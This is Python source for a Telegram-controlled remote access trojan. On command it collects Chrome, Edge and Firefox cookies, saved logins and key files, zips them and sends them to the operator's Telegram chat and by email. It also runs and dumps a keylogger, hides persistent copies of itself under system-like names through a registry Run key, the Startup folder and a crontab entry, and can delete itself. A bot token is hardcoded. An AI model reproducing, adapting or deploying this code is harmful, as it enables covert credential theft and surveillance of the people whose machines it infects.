import os, sys
import zipfile
from sendmail import SendMail
from subprocess import call, run
from shutil import copyfile
from telebot import TeleBot, custom_filters
from getpass import getuser
import threading
import key_logger
import platform
from crontab import CronTab


TOKEN = "5053588337:AAFaCoKRQH9YXIu6EPE2OPDdCXJf_zWNGh4"
SERVER = 'YOUR_USER_ID'


bot = TeleBot(TOKEN, parse_mode=None)
system = platform.system()
if system == 'Windows':
    from windows_tools.installed_software import get_installed_software
key_log = key_logger.Keylogger()
cmds = '/help\n\n\
/device_info\n\
/installed_browsers\n\n\
/get_Chrome\n\
/get_Firefox\n\
/get_Edge\n\n\
/keylogger_start\n\
/keylogs_dump\n\
/keylogger_stop\n\n\
/remove_keylogs\n\
/delete_rat\n'


# show help command
@bot.message_handler(chat_id=[SERVER],commands=['help','start'])
def send_help(message):
    bot.reply_to(message, cmds)


# Device information
@bot.message_handler(chat_id=[SERVER],commands=['device_info'])
def device_info(message):
    uname = platform.uname()
    info = f"System: {uname.system}\nNode Name: {uname.node}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}"
    bot.reply_to(message, info)


# get install browsers
@bot.message_handler(chat_id=[SERVER],commands=['installed_browsers'])
def get_installed_browsers(message):
    if system == 'Windows':
        browsers = get_installed_windows_browsers()
    elif system == 'Linux':
        browsers = get_installed_linux_browsers()
    else:
        browsers = 'Didn''t find any browser'

    bot.reply_to(message, browsers)


# Installed browsers windows
def get_installed_windows_browsers():
    browsers = ['Google Chrome','Mozilla Firefox','Microsoft Edge']
    installed_browsers = ""

    for software in get_installed_software():
        for b in browsers:
            if b in software['name']:
                installed_browsers += f"{software['name'],software['version'],software['publisher']}\n"

    return installed_browsers


# Installed browsers linux
def get_installed_linux_browsers():
    browsers = ['chrome','firefox','safari']
    installed_browsers = ""

    pl = run('apt list --installed', shell=True, capture_output=True, text=True)

    for b in browsers:
        if b in pl.stdout:
            installed_browsers += "\n"+ b 

    return installed_browsers


# Get chrome cookies|logins|key win and linux
@bot.message_handler(chat_id=[SERVER],commands=['get_Chrome'])
def get_Chrome(message):
    if system == 'Windows':
        all_paths = {'cookies':os.getenv('LocalAppData')+'\\Google\\Chrome\\User Data\\Default\\Network\\Cookies','logins':os.getenv('LocalAppData')+'\\Google\\Chrome\\User Data\\Default\\Login Data','key':os.getenv('LocalAppData')+'\\Google\\Chrome\\User Data\\Local State'}

    elif system == 'Linux':
        all_paths = {'cookies':f'/home/{getuser()}/.config/google-chrome/Default/Cookies','logins':f'/home/{getuser()}/.config/google-chrome/Default/Login Data','key':f'/home/{getuser()}/.config/google-chrome/Local State'}


    send_files_el(all_paths)
    send_files_tg(all_paths)


# Get Edge cookies|logins|key win
@bot.message_handler(chat_id=[SERVER],commands=['get_Edge'])
def get_Edge(message):
    if system == 'Windows':
        all_paths = {'cookies':os.getenv('LocalAppData')+'\\Microsoft\\Edge\\User Data\\Default\\Cookies','logins':os.getenv('LocalAppData')+'\\Microsoft\\Edge\\User Data\\Default\\Login Data','key':os.getenv('LocalAppData')+'\\Microsoft\\Edge\\User Data\\Local State'}
        send_files_el(all_paths)
        send_files_tg(all_paths)
    else:
        bot.send_message(SERVER,'Edge isn''t installed')


# Get firefox cookies|logins|key win and linux
@bot.message_handler(chat_id=[SERVER],commands=['get_Firefox'])
def get_Firefox(message):
    if system == 'Windows':
        ffpath = get_firefox_path()
        all_paths = {'cookies':ffpath+'cookies.sqlite','logins':ffpath+'logins.json','key':ffpath+'key4.db'}

    elif system == 'Linux':
        ffpath = f"/home/{getuser()}/.mozilla/firefox/{get_firefox_path_linux()}/"
        all_paths = {'cookies':ffpath+'cookies.sqlite','logins':ffpath+'logins.json','key':ffpath+'key4.db'}

    send_files_el(all_paths)
    send_files_tg(all_paths)
    

# Get main default path for Firefox
def get_firefox_path():
    root_path = os.getenv("AppData") + "\\Mozilla\\Firefox\\Profiles\\"

    for d in os.listdir(root_path):
        if d.endswith('default-release'):
            root_path += f"\\{d}\\"

    return root_path

def get_firefox_path_linux():
    root_path = f"/home/{getuser()}/.mozilla/firefox/"

    for d in os.listdir(root_path):
        if d.endswith('default-esr') or d.endswith('default-release'):
            return d


# Making the script persistant on windows using startup dir
def pwsf():
    startup = os.getenv('appdata') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    if os.getcwd() == startup:
        None
    else:
        copyfile(sys.executable, f'{startup}\\system_modules_dependence.exe')


# Making the script persistant on windows using startup reg
def pwre():
    location = os.getenv('appdata') + '\\win32moduledependencies.exe'
    if os.path.exists(location):
        None
    else:
        copyfile(sys.executable, location)
        call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Sys32Module /t REG_SZ /d "' + location + '"', shell=True)


# Making the scrip persistant for linux using crontab
def persistance_linux():
    try:
        os.mkdir(f'/home/{getuser()}/Documents/.important_binaries')
    except Exception:
        pass
        
    try:
        copyfile(__file__, f'/home/{getuser()}/Documents/.important_binaries/systembinx68.py')
    except Exception:
        pass

    try:
        t_Cron = CronTab(user=getuser())
        job = t_Cron.new(command=f'python3 /home/{getuser()}/Documents/.important_binaries/systembinx68.py &')
        job.every_reboot()
        t_Cron.write()
    except Exception:
        pass


# main persistant function
def main_persistant():
    if system == 'Windows':
        try:
            pwre()
        except Exception:
            pwsf()
    elif system == 'Linux':
        try:
            persistance_linux()
        except Exception:
            pass   


# keylogger start
@bot.message_handler(chat_id=[SERVER],commands=['keylogger_start'])
def keylogger_start(message):
    if not key_log.running:
        th = threading.Thread(target=key_log.start)
        th.start()
        bot.reply_to(message, "Keylogger started")
    else:
        bot.reply_to(message, "Keylogger already running")


# keylogs dump
@bot.message_handler(chat_id=[SERVER],commands=['keylogs_dump'])
def keylogs_dump(message):
    if system == 'Windows':
        logpath = os.getenv('appdata') + '\\processmanager.txt'
    elif system == 'Linux':
        logpath = f'/home/{getuser()}/Documents/.processes_modules.txt'

    if os.path.exists(logpath):
        with zipfile.ZipFile('L8AP5R7U.zip','w') as rzip:
            rzip.write(logpath)
            SendMail.send('L8AP5R7U.zip')
        keylogs = open(logpath, 'rb')
        bot.send_document(SERVER, keylogs)
        os.remove('L8AP5R7U.zip')
    else:
        bot.send_message(SERVER, "No Logfile was found")


# keylogger stop
@bot.message_handler(chat_id=[SERVER],commands=['keylogger_stop'])
def keylogger_stop(message):
    if key_log.running:
        key_log.self_destruct()
        bot.reply_to(message, "Keylogger stopped")
    else:
        bot.reply_to(message, "Keylogger not running")


# delete keylogs
@bot.message_handler(chat_id=[SERVER],commands=['remove_keylogs'])
def keylogs_dump(message):
    if system == 'Windows':
        logpath = os.getenv('appdata') + '\\processmanager.txt'
    elif system == 'Linux':
        logpath = f'/home/{getuser()}/Documents/.processes_modules.txt'

    if os.path.exists(logpath):
        try:
            os.remove(logpath)
        except:
            bot.send_message(SERVER, "Coudn't Delete logs! Try later")
    else:
        bot.send_message(SERVER, "No Logfile was found")



def send_files_el(all_paths):
    with zipfile.ZipFile('T8AP5R7U.zip','w') as rzip:
        for a in all_paths:
            if os.path.exists(all_paths[a]):
                rzip.write(all_paths[a])

    SendMail.send('T8AP5R7U.zip')
    os.remove('T8AP5R7U.zip')


# files sending function
def send_files_tg(all_paths):
    for a in all_paths:
        if os.path.exists(all_paths[a]):
            file = open(all_paths[a], 'rb')
            bot.send_document(SERVER, file)
        else:
            bot.send_message(SERVER, f'{a} doesn''t exist')


# delete rat
@bot.message_handler(chat_id=[SERVER],commands=['delete_rat'])
def delete_self(message):
    if system == 'Windows':
        path = os.getenv('appdata') + '\\win32moduledependencies.exe'
        if os.path.exists(path):
            os.remove(path)
        path2 = os.getenv('appdata') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        if os.path.exists(path2):
            os.remove(path2)
    elif system == 'Linux':
        path = f'/home/{getuser()}/Documents/.important_binaries/systembinx68'
        if os.path.exists(path):
            os.remove(path)
    if system == 'Windows':
        os.remove(sys.executable)
    elif system == 'Linux':
        os.remove(sys.argv[0])


if __name__ == '__main__':
    main_persistant()
    bot.add_custom_filter(custom_filters.ChatFilter())
    bot.infinity_polling()